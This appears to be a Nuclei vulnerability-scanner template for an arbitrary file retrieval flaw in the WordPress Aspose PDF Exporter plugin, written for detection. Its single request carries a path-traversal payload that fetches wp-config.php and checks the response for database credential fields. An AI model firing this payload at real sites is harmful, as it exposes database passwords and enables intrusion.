id: aspose-pdf-file-download
info:
  author: 0x_Akoko
  description: The Aspose.psf Exporter WordPress plugin is affected by an arbitrary
    file retrieval vulnerability.
  name: WordPress Aspose PDF Exporter - Arbitrary File Retrieval
  reference:
  - https://packetstormsecurity.com/files/131161
  - https://wordpress.org/plugins/aspose-pdf-exporter
  severity: high
  tags: wordpress,wp-plugin,lfi,aspose
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php'
